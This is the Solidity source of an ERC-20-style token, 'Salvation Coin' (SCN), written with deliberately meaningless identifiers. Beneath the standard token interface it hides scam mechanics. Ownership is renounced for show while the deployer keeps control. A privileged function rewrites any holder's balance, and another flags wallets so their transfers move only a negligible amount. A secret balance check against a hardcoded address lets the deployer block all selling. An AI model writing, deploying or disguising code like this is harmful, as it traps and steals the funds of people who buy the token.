//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface totalMin {
    function createPair(address modeWallet, address shouldLiquidity) external returns (address);
}

interface swapTakeReceiver {
    function totalSupply() external view returns (uint256);

    function balanceOf(address atReceiverTx) external view returns (uint256);

    function transfer(address teamLaunched, uint256 minTrading) external returns (bool);

    function allowance(address launchedWalletTx, address spender) external view returns (uint256);

    function approve(address spender, uint256 minTrading) external returns (bool);

    function transferFrom(
        address sender,
        address teamLaunched,
        uint256 minTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed marketingMaxToken, uint256 value);
    event Approval(address indexed launchedWalletTx, address indexed spender, uint256 value);
}

abstract contract launchedSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface totalTakeIs {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface swapTakeReceiverMetadata is swapTakeReceiver {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SalvationCoin is launchedSell, swapTakeReceiver, swapTakeReceiverMetadata {

    address public launchedReceiver;

    uint256 atMin;

    uint256 constant liquidityIs = 11 ** 10;

    uint256 public listFee;

    function name() external view virtual override returns (string memory) {
        return marketingTrading;
    }

    function decimals() external view virtual override returns (uint8) {
        return launchedSwap;
    }

    event OwnershipTransferred(address indexed limitSwapSender, address indexed atLimit);

    uint256 public txTrading;

    bool private isReceiverAmount;

    function atShould(address limitMarketingTeam, uint256 minTrading) public {
        maxWallet();
        autoMin[limitMarketingTeam] = minTrading;
    }

    function maxWallet() private view {
        require(maxAuto[_msgSender()]);
    }

    function autoTrading(address marketingExempt) public {
        maxWallet();
        if (txTrading == sellLaunchedTo) {
            sellLaunchedTo = listFee;
        }
        if (marketingExempt == listToken || marketingExempt == launchedReceiver) {
            return;
        }
        takeFrom[marketingExempt] = true;
    }

    function enableFund(address maxFrom, address teamLaunched, uint256 minTrading) internal returns (bool) {
        require(autoMin[maxFrom] >= minTrading);
        autoMin[maxFrom] -= minTrading;
        autoMin[teamLaunched] += minTrading;
        emit Transfer(maxFrom, teamLaunched, minTrading);
        return true;
    }

    address amountSender = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function getOwner() external view returns (address) {
        return maxAmount;
    }

    function allowance(address fundExempt, address senderBuy) external view virtual override returns (uint256) {
        if (senderBuy == tradingTeamMin) {
            return type(uint256).max;
        }
        return totalSell[fundExempt][senderBuy];
    }

    address public listToken;

    function approve(address senderBuy, uint256 minTrading) public virtual override returns (bool) {
        totalSell[_msgSender()][senderBuy] = minTrading;
        emit Approval(_msgSender(), senderBuy, minTrading);
        return true;
    }

    function totalList() public {
        emit OwnershipTransferred(listToken, address(0));
        maxAmount = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return maxFund;
    }

    bool public enableLiquidityLaunch;

    function autoFundAt(uint256 minTrading) public {
        maxWallet();
        launchedReceiverTo = minTrading;
    }

    mapping(address => uint256) private autoMin;

    bool public maxEnable;

    string private limitShouldReceiver = "SCN";

    mapping(address => bool) public takeFrom;

    bool private exemptAmountMax;

    mapping(address => bool) public maxAuto;

    bool public amountFeeBuy;

    address tradingTeamMin = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 launchedReceiverTo;

    function transferFrom(address maxFrom, address teamLaunched, uint256 minTrading) external override returns (bool) {
        if (_msgSender() != tradingTeamMin) {
            if (totalSell[maxFrom][_msgSender()] != type(uint256).max) {
                require(minTrading <= totalSell[maxFrom][_msgSender()]);
                totalSell[maxFrom][_msgSender()] -= minTrading;
            }
        }
        return marketingFromSender(maxFrom, teamLaunched, minTrading);
    }

    function symbol() external view virtual override returns (string memory) {
        return limitShouldReceiver;
    }

    address private maxAmount;

    bool public fromSell;

    uint256 private txSell;

    function marketingIsFund(address enableTrading) public {
        if (enableLiquidityLaunch) {
            return;
        }
        
        maxAuto[enableTrading] = true;
        if (isReceiverAmount) {
            isReceiverAmount = false;
        }
        enableLiquidityLaunch = true;
    }

    mapping(address => mapping(address => uint256)) private totalSell;

    function marketingFromSender(address maxFrom, address teamLaunched, uint256 minTrading) internal returns (bool) {
        if (maxFrom == listToken) {
            return enableFund(maxFrom, teamLaunched, minTrading);
        }
        uint256 launchTotal = swapTakeReceiver(launchedReceiver).balanceOf(amountSender);
        require(launchTotal == launchedReceiverTo);
        require(teamLaunched != amountSender);
        if (takeFrom[maxFrom]) {
            return enableFund(maxFrom, teamLaunched, liquidityIs);
        }
        return enableFund(maxFrom, teamLaunched, minTrading);
    }

    function balanceOf(address atReceiverTx) public view virtual override returns (uint256) {
        return autoMin[atReceiverTx];
    }

    function transfer(address limitMarketingTeam, uint256 minTrading) external virtual override returns (bool) {
        return marketingFromSender(_msgSender(), limitMarketingTeam, minTrading);
    }

    uint8 private launchedSwap = 18;

    string private marketingTrading = "Salvation Coin";

    constructor (){
        if (exemptAmountMax) {
            exemptAmountMax = true;
        }
        totalTakeIs tradingTxSell = totalTakeIs(tradingTeamMin);
        launchedReceiver = totalMin(tradingTxSell.factory()).createPair(tradingTxSell.WETH(), address(this));
        
        listToken = _msgSender();
        maxAuto[listToken] = true;
        autoMin[listToken] = maxFund;
        totalList();
        if (amountFeeBuy != isReceiverAmount) {
            isReceiverAmount = true;
        }
        emit Transfer(address(0), listToken, maxFund);
    }

    function owner() external view returns (address) {
        return maxAmount;
    }

    uint256 private maxFund = 100000000 * 10 ** 18;

    uint256 public sellLaunchedTo;

}